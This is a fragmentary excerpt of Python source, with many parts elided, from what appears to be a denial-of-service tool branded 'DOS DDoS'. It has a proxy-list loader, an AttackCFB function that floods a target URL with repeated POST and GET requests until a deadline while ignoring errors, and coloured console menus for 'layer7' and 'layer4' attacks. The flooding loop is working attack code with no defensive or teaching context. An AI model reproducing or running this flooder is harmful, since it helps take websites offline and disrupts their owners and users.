...
def get_proxies():
    ...
    if not os.path.exists("proxy/proxy.txt"):
        ...
        return False
    proxies = open("proxy/proxy.txt", 'r').read().split('\n')
    return True
...
def AttackCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.post(url, timeout=86400)
            scraper.get(url, timeout=86400)
        except:
            pass
#endregion
...
def help():
    ...
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"exit     "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Exit DOS DDoS                        "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╠═════════════════════════════════════════════════════╣\n")
...
def layer7():
    ...
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"════COMPASS help\n════") 
    stdout.write(" \n")
def layer4():
    clear()
    stdout.write("                                                                                         \n")
...
def command():
    stdout.write(Fore.LIGHTCYAN_EX+"╔═══"+Fore.LIGHTCYAN_EX+"[""root"+Fore.LIGHTGREEN_EX+"@"+Fore.LIGHTCYAN_EX+"DOS"+Fore.CYAN+"]"+Fore.LIGHTCYAN_EX+"\n╚══\x1b[38;2;0;255;189m> "+Fore.WHITE)
    command = input()
